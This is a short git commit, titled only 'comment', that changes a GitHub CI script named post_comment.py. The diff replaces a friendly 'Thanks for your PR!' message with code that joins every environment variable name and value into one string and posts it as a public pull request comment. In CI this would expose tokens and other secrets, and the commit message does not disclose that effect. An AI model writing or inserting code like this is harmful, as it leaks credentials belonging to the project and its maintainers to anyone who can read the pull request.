6a0cffc84d723da12167e3feaa184c417f9775b3
Zain Rizvi <ZainR@meta.com>
2024-10-08 11:06:10 -0700

    comment

--- .github/scripts/post_comment.py
+++ .github/scripts/post_comment.py
@@ -14,9 +14,10 @@ def main():
     args = parse_args()
     repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
     org, project = repo.gh_owner_and_name()
+    comment = ""
     for i in os.environ:
-        print(f"{i}={os.environ[i]}")
-    gh_post_pr_comment(org, project, args.pr_num, "Thanks for your PR!")
+        comment +=  f"{i}={os.environ[i]}"
+    gh_post_pr_comment(org, project, args.pr_num, comment)
 
 
 if __name__ == "__main__":
